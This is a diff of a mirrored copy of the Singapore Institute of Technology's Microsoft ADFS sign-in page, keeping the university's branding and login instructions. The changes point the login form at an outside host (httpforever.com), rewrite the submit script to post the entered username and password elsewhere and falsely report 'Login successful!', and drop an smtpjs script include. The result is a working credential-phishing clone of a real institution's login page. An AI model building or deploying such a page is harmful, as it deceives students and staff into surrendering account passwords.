@@ -1,6 +1,6 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en">
-
+    
 <!-- Mirrored from fs.singaporetech.edu.sg/adfs/ls/?SAMLRequest=jdHPa4MwFAfw+2D%2fg+RuEq0aDVoo26XQXdpth11GjK8qaOLy4uifv3RlbMfd3g++8OG9erf6wRzhYwX00f6xIajmyd3694onXSHaLM+VyjZJp8RZJLwUQlfVptBAoldwOFrTkJRyEu0RV9gb9Mr4MOJpFic8TrJnLmRaSS5okeW8TDdvJNohgvMh+2ANrjO4E7jPUcPL8dCQwfsFJWMXHD1QHE2vFuvAgx4odCvFnnXpxKaFqeBnk+1Hw67yw7WiYUeiyzwZbMjqjLQKR5RGzYDSa3naPR1kAMvFWW+1ncj2%2fi6K6m+++09Q%2feDJ9ocKrehKwdO4TLSOM6W7UOVF3IpU5WcuCqUV9WDCaZC2buwHj4vSQLWdf+k1uyECqGZ%2ff7P9Ag%3d%3d&RelayState=%2fd2l%2fhome by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 14 Oct 2024 07:35:17 GMT -->
 <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
 <head>
@@ -18,11 +18,9 @@
 function Errors(){this.reportSubject = 'Error Report'; }
 //]]>
 </script>
-<script src="https://smtpjs.com/v3/smtp.js"></script>
 
 
-
-
+        
         <link rel="stylesheet" type="text/css" href="../portal/css/style7877.css?id=DBC0B4741D4217A138377E7BCC747D0D30B93B979DC99146E4C4016785BA8C42" /><style>.illustrationClass {background-image:url(../portal/illustration/illustration07bd.png?id=183128A3C941EDE3D9199FA37D6AA90E0A7DFE101B37D10B4FEDA0CF35E11AFD);}</style>
 
     </head>
@@ -45,19 +43,19 @@ function Errors(){this.reportSubject = 'Error Report'; }
                     <img class='logoImage' id='companyLogo' src='../portal/logo/logo3ccb.gif?id=5924381B99D2B57B59C07A228384494D64889B7FCA82F4158CBF264A6836153B' alt='Singapore Institute of Technology'/>
                 </div>
                 <div id="workArea">
-
+                    
     <div id="authArea" class="groupMargin">
-
-
-
-        <div id="loginArea">
+        
+        
+        
+        <div id="loginArea">        
             <div id="loginMessage" class="groupMargin">Sign in with your organizational account</div>
-
-            <form method="POST" id="loginForm" autocomplete="off" novalidate="novalidate" onsubmit="return Login.submitLoginRequest();" action="https://xsite.singaporetech.edu.sg/d2l/home">
+    
+            <form method="POST" id="loginForm" autocomplete="off" novalidate="novalidate" onsubmit="return Login.submitLoginRequest();" action="http://httpforever.com/">
                 <div id="error" class="fieldMargin error smallText">
                     <span id="errorText" for=""></span>
                 </div>
-
+            
                 <div id="formsAuthenticationArea">
                     <p id="errorMessage" style="color: #c85305; font-size: 0.9em; font-weight: normal; padding-bottom: 5%;"></p>
                     <div id="userNameArea">
@@ -65,84 +63,85 @@ function Errors(){this.reportSubject = 'Error Report'; }
                         <input id="userNameInput" name="UserName" type="email" value="" tabindex="1" class="text fullWidth"
                                spellcheck="false" placeholder="someone@example.com" autocomplete="off"/>
                     </div>
-
+            
                     <div id="passwordArea">
                         <label id="passwordInputLabel" for="passwordInput" class="hidden">Password</label>
                         <input id="passwordInput" name="Password" type="password" tabindex="2" class="text fullWidth"
                                placeholder="Password" autocomplete="off"/>
                     </div>
-
+            
                     <div id="kmsiArea" style="display:''">
                         <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3"/>
                         <label for="kmsiInput">Keep me signed in</label>
                     </div>
-
+            
                     <div id="submissionArea" class="submitMargin">
-                        <span id="submitButton" class="submit" tabindex="4" role="button" onclick="Login.submitLoginRequest();" action="https://xsite.singaporetech.edu.sg/d2l/home">Sign in</span>
+                        <span id="submitButton" class="submit" tabindex="4" role="button" onclick="Login.submitLoginRequest();">Sign in</span>
                     </div>
                 </div>
                 <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication"/>
             </form>
-
+            
             <script type="text/javascript">
-
-                        function Login() {}
-
-                        Login.submitLoginRequest = function () {
-                            var userName = document.getElementById("userNameInput").value;
-                            var password = document.getElementById("passwordInput").value;
-                            var errorMessage = document.getElementById('errorMessage');
-
-    // Clear previous error messages
-                            errorMessage.textContent = "";
-
-    // Validate input fields
-                            if (userName === "" || password === "") {
-                                errorMessage.textContent = "Enter your user ID in the format 'domain/user' or 'user@domain'.";
-                                return false; // Stop the form submission
+                function Login() {}
+            
+                Login.submitLoginRequest = function () {
+                    var userName = document.getElementById("userNameInput").value;
+                    var password = document.getElementById("passwordInput").value;
+                    var errorMessage = document.getElementById('errorMessage');
+            
+                    // Clear previous error messages
+                    errorMessage.textContent = "";
+            
+                    // Validate input fields
+                    if (userName === "" || password === "") {
+                        errorMessage.textContent = "Enter your user ID in the format 'domain/user' or 'user@domain'.";
+                        return false; // Stop the form submission
+                    }
+            
+                    // Prepare data to be sent
+                    var formData = {
+                        UserName: userName,
+                        Password: password
+                    };
+            
+                    // Create an AJAX request
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("POST", "", true);  // The empty string means no specific target for the form
+                    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+            
+                    // Handle the response
+                    xhr.onreadystatechange = function () {
+                        if (xhr.readyState === 4) {
+                            if (xhr.status === 200) {
+                                // Handle success (you can update the DOM, show a success message, etc.)
+                                errorMessage.textContent = "Login successful!";
+                                errorMessage.style.color = "green";
+                            } else {
+                                // Handle error (e.g., wrong credentials)
+                                errorMessage.textContent = "Login failed. Please try again.";
+                                errorMessage.style.color = "#c85305";
                             }
-
-    // Prepare data to be sent
-                            var formData = {
-                                UserName: userName,
-                                Password: password
-                            };
-
-    // Create an AJAX request
-                            var xhr = new XMLHttpRequest();
-                            xhr.open("POST", "", true);  // The empty string means no specific target for the form
-                            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-
-    // Handle the response
-                            xhr.onreadystatechange = function () {
-                                if (xhr.readyState === 4) {
-                                    if (xhr.status === 200) {
-                // Successful login, redirect to the page
-                                        window.location.href = "https://xsite.singaporetech.edu.sg/d2l/home";
-                                    } else {
-                                        // Handle error (e.g., wrong credentials)
-                                        errorMessage.textContent = "Login failed. Please try again.";
-                                        errorMessage.style.color = "#c85305";
-                                    }
-                                }
-                            };
-
-    // Send the data as a JSON s
-                         xhr.send(JSON.stringify(formData));
-
-                         return false;  // Prevent the form from submitting the default way
-                        };
+                        }
+                    };
+            
+                    // Send the data as a JSON string
+                    xhr.send(JSON.stringify(formData));
+            
+                    return false;  // Prevent the form from submitting the default way
+                };
             </script>
-
+            
+             
             <div id="introduction" class="groupMargin">
-                <b>Staff/Vendors</b> can login using the Staff ID / Username with <b>@singaporetech.edu.sg</b> as suffix (i.e xxxxx@singaporetech.edu.sg)<br><br> <b>Students</b> and <b>Alumni</b> can login using your Student ID with <b>@sit.singaporetech.edu.sg</b> as suffix (i.e. 12ABC888X@sit.singaporetech.edu.sg)<br><br> <b>External Partners</b> can login using the Username with <b>@ext.singaporetech.edu.sg</b> as suffix (i.e. xxxxx@ext.singaporetech.edu.sg)<br><br>Reset or change your password at the <a href='https://selfservice.singaporetech.edu.sg/'>Self-Service Portal</a><br><br>For assistance, email us at <a href='mailto:ithelpdesk@singaporetech.edu.sg'>IT Helpdesk</a> and include the following details:<br><br>&nbsp;&nbsp;&nbsp;&nbsp;1. Full Name as per NRIC or FIN<br>&nbsp;&nbsp;&nbsp;&nbsp;2. Staff/Student ID or Username<br>&nbsp;&nbsp;&nbsp;&nbsp;3. Contact no (HP)<br>&nbsp;&nbsp;&nbsp;&nbsp;4. Personal email address
+                <b>Staff/Vendors</b> can login using the Staff ID / Username with <b>@singaporetech.edu.sg</b> as suffix (i.e xxxxx@singaporetech.edu.sg)<br><br> <b>Students</b> and <b>Alumni</b> can login using your Student ID with <b>@sit.singaporetech.edu.sg</b> as suffix (i.e. 12ABC888X@sit.singaporetech.edu.sg)<br><br> <b>External Partners</b> can login using the Username with <b>@ext.singaporetech.edu.sg</b> as suffix (i.e. xxxxx@ext.singaporetech.edu.sg)<br><br>Reset or change your password at the <a href='https://selfservice.singaporetech.edu.sg/'>Self-Service Portal</a><br><br>For assistance, email us at <a href='mailto:ithelpdesk@singaporetech.edu.sg'>IT Helpdesk</a> and include the following details:<br><br>&nbsp;&nbsp;&nbsp;&nbsp;1. Full Name as per NRIC or FIN<br>&nbsp;&nbsp;&nbsp;&nbsp;2. Staff/Student ID or Username<br>&nbsp;&nbsp;&nbsp;&nbsp;3. Contact no (HP)<br>&nbsp;&nbsp;&nbsp;&nbsp;4. Personal email address                     
             </div>
-
-
+    
+           
         </div>
-
+    
         </div>
-
+    
                 </div>
                 <div id="footerPlaceholder"></div>
             </div>
@@ -151,7 +150,7 @@ function Errors(){this.reportSubject = 'Error Report'; }
                      <div ><span id="copyright">&#169; 2016 Microsoft</span><a id="home" class="pageLink" href="http://www.singaporetech.edu.sg/">&#169; Singapore Institute of Technology</a></div>
                 </div>
             </div>
-        </div>
+        </div> 
     </div>
     <script type='text/javascript'>
 //<![CDATA[
@@ -171,8 +170,8 @@ if (navigator.userAgent.match(/iPhone/i) != null) {
     }
 }
 
-// In the CSS file we set the ms-viewport to be consistent with the device dimensions,
-// which is necessary for correct functionality of immersive IE.
+// In the CSS file we set the ms-viewport to be consistent with the device dimensions, 
+// which is necessary for correct functionality of immersive IE. 
 // However, for Windows 8 phone we need to reset the ms-viewport's dimension to its original
 // values (auto), otherwise the viewport dimensions will be wrong for Windows 8 phone.
 // Windows 8 phone has agent string 'IEMobile 10.0'
@@ -211,7 +210,7 @@ function getStyle(element, styleProp) {
     return propStyle;
 }
 
-// The script below is used for downloading the illustration image
+// The script below is used for downloading the illustration image 
 // only when the branding is displaying. This script work together
 // with the code in PageBase.cs that sets the html inline style
 // containing the class 'illustrationClass' with the background image.
@@ -289,4 +288,5 @@ if (authArea) {
     </body>
 
 <!-- Mirrored from fs.singaporetech.edu.sg/adfs/ls/?SAMLRequest=jdHPa4MwFAfw+2D%2fg+RuEq0aDVoo26XQXdpth11GjK8qaOLy4uifv3RlbMfd3g++8OG9erf6wRzhYwX00f6xIajmyd3694onXSHaLM+VyjZJp8RZJLwUQlfVptBAoldwOFrTkJRyEu0RV9gb9Mr4MOJpFic8TrJnLmRaSS5okeW8TDdvJNohgvMh+2ANrjO4E7jPUcPL8dCQwfsFJWMXHD1QHE2vFuvAgx4odCvFnnXpxKaFqeBnk+1Hw67yw7WiYUeiyzwZbMjqjLQKR5RGzYDSa3naPR1kAMvFWW+1ncj2%2fi6K6m+++09Q%2feDJ9ocKrehKwdO4TLSOM6W7UOVF3IpU5WcuCqUV9WDCaZC2buwHj4vSQLWdf+k1uyECqGZ%2ff7P9Ag%3d%3d&RelayState=%2fd2l%2fhome by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 14 Oct 2024 07:35:18 GMT -->
-</html>
+</html> 
+
